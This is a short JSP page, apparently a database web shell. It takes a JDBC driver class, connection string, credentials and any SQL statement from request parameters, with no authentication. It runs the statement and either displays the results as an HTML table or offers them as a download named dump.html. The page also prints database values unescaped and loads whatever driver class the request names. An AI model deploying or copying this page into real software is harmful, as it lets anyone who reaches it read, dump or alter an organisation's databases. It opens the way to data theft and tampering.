<%@ page buffer="none" %>
<%@page import="java.sql.*"%>
<%

String down=request.getParameter("download");
if(down==null){
	out.println("<HTML>\n<HEAD>\n</HEAD>\n<BODY>\n");
}
try{
    if(down!=null){
        response.setContentType("application/x-download"); 
        response.setHeader("Content-Disposition", "attachment; filename=dump.html");
    }
    String upd=request.getParameter("update");
    if(upd!=null){
    }
    Connection conn = null;
    Statement st;
    ResultSet rs;
    String q=request.getParameter("query");
        Class.forName(request.getParameter("class"));
        conn = DriverManager.getConnection(request.getParameter("constr"), request.getParameter("usr"), request.getParameter("pwd"));
        st=conn.createStatement();
        if(upd!=null){
		st.executeUpdate(q);
        } else {
		rs=st.executeQuery(q);
		ResultSetMetaData rsmd = rs.getMetaData();
		int columns = rsmd.getColumnCount();
		int numberOfColumns = rsmd.getColumnCount();
		if(down==null){
			out.println("<table border=1><thead>");
		}
		for (int i = 1; i <= numberOfColumns; i++) {
		    String columnName = rsmd.getColumnName(i);
		    if(columnName==null){
			columnName="NULL";
		    }
		    if(down==null){
			    out.print("<th>"+columnName+"</th>");
		    } else {
			    out.print("'"+columnName+"',");
		    }
		}
		if(down==null){
			out.println("</thead><tbody>");
		} else {
			out.println("\n");
		}
		while (rs.next()) {
		if(down==null){
			out.println("<tr>");
		}
		for (int i = 1; i <= numberOfColumns; i++) {
		    String columnValue = rs.getString(i);
		    if(columnValue==null){
			columnValue="NULL";
		    }
		    if(down==null){
			    out.println("<td>"+columnValue+"</td>");
		    } else {
			    out.print("'"+columnValue.replaceAll("  "," ")+"',");
		    }
		}
		if(down==null){
			out.println("</tr>");
		} else {
			out.print("\n");	
		}
	      }
		if(down==null){
		      out.println("</tbody></table>");  
		}
              conn.close();
      }
}
   catch (Exception e){
      out.println("An exception occurred: " + e.getMessage());
   }
if(down==null){
	out.println("</BODY>\n</HTML>");
}
%>
